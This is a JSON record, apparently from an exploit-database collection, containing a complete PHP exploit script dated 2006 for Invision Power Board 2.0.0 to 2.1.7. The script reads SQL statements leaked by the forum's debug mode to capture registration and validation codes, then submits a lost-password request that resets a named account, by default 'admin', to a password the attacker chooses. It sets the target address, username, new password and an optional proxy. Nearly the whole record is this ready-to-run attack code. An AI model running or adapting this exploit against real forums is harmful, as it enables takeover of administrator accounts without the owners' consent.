{
  "id": "2696",
  "title": "Invision Power Board 2.1.7 - &#039;Debug&#039; Remote Password Change",
  "cve": null,
  "vuln_type": "unknown",
  "code": "<?php\r\n/*\r\n\r\n Debug Mode password change vulnerability\r\n Affects Invision Power Borard 2.0.0 to 2.1.7\r\n by Rapigator\r\n \r\n This works if:\r\n\r\n \"Debug Level\" is set to 3\r\n or\r\n Enable SQL Debug Mode is turned on\r\n \r\n In General Configuration of the forum software.\r\n\r\n*/\r\n\r\n// The forum's address up to and including 'index.php'\r\n$site = \"http://localhost/forums/index.php\";\r\n\r\n// An existing user's login name\r\n$name = \"admin\";\r\n\r\n// The new password(3-32 characters)\r\n$pass = \"1234\";\r\n\r\n// You can use a proxy...\r\n// $proxy = \"1.2.3.4:8080\";\r\n\r\n\r\n\r\n// -----------------------------\r\n$site .= \"?\";\r\n$suffix = \"\";\r\n$name = urlencode($name);\r\n$pass = urlencode($pass);\r\n$curl = curl_init($site.'act=Reg&CODE=10');\r\ncurl_setopt($curl, CURLOPT_PROXY, $proxy);\r\ncurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\r\ncurl_setopt($curl, CURLOPT_TIMEOUT, 10);\r\n$page = curl_exec($curl);\r\ncurl_close($curl);\r\nif (preg_match('/<span class=\\'green\\'>INSERT<\\/span> INTO <span class=\\'purple\\'>([\\\\w]*?)_reg_antispam<\\/span> \\\\(regid,regcode,ip_address,ctime\\\\) VALUES\\\\(\\'([\\\\w]{32}?)\\',([\\\\d]*?),/', $page, $regs)) {\r\n\t$prefix = $regs[1];\r\n\t$regid = $regs[2];\r\n\t$regcode = $regs[3];\r\n} else {\r\n\t$suffix = \"&debug=1\";\r\n\t$curl = curl_init($site.'act=Reg&CODE=10'.$suffix);\r\n\tcurl_setopt($curl, CURLOPT_PROXY, $proxy);\r\n\tcurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($curl, CURLOPT_TIMEOUT, 10);\r\n\t$page = curl_exec($curl);\r\n\tcurl_close($curl);\r\n\tif (preg_match('/INSERT INTO ([\\\\w]*?)_reg_antispam \\\\(regid,regcode,ip_address,ctime\\\\) VALUES\\\\(\\'([\\\\w]{32}?)\\',([\\\\d]*?),/', $page, $regs)) {\r\n\t\t$prefix = $regs[1];\r\n\t\t$regid = $regs[2];\r\n\t\t$regcode = $regs[3];\r\n\t}\r\n}\r\nif (!isset($regid) || !isset($regcode)) {\r\n\techo \"Error: Probably not vulnerable, or no forum found\";\r\n\texit;\r\n}\r\n\r\n$curl = curl_init($site.$suffix);\r\ncurl_setopt($curl, CURLOPT_PROXY, $proxy);\r\ncurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\r\ncurl_setopt($curl, CURLOPT_POST, 1);\r\ncurl_setopt($curl, CURLOPT_POSTFIELDS, \"act=Reg&CODE=11&member_name={$name}&regid={$regid}&reg_code={$regcode}\");\r\ncurl_setopt($curl, CURLOPT_TIMEOUT, 10);\r\n$page = curl_exec($curl);\r\ncurl_close($curl);\r\nif (preg_match('/<span class=\\'green\\'>INSERT<\\/span> INTO <span class=\\'purple\\'>'.$prefix.'_validating<\\/span> \\\\(vid,member_id,real_group,temp_group,entry_date,coppa_user,lost_pass,ip_address\\\\) VALUES\\\\(\\'([\\\\w]{32}?)\\',([\\\\d]{1,32}?),/', $page, $regs)) {\r\n\tchange_pass($regcode,$regid,$regs[1],$regs[2]);\r\n}\r\nif (preg_match('/INSERT INTO '.$prefix.'_validating \\\\(vid,member_id,real_group,temp_group,entry_date,coppa_user,lost_pass,ip_address\\\\) VALUES\\\\(\\'([\\\\w]{32}?)\\',([\\\\d]{1,32}?),/', $page, $regs)) {\r\n\tchange_pass($regcode,$regid,$regs[1],$regs[2]);\r\n}\r\n\r\nfunction change_pass($regcode,$regid,$vid,$userid) {\r\n\tglobal $site, $proxy, $name, $pass;\r\n\t$curl = curl_init($site.$suffix);\r\n\tcurl_setopt($curl, CURLOPT_PROXY, $proxy);\r\n\tcurl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);\r\n\tcurl_setopt($curl, CURLOPT_POST, 1);\r\n\tcurl_setopt($curl, CURLOPT_POSTFIELDS, \"act=Reg&CODE=03&type=lostpass&uid={$userid}&aid={$vid}&regid={$regid}&reg_code={$regcode}&pass1={$pass}&pass2={$pass}\");\r\n\tcurl_setopt($curl, CURLOPT_TIMEOUT, 10);\r\n\t$page = curl_exec($curl);\r\n\tcurl_close($curl);\r\n\techo \"Password Changed!\";\r\n\texit;\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-11-01]",
  "url": "https://www.exploit-db.com/exploits/2696"
}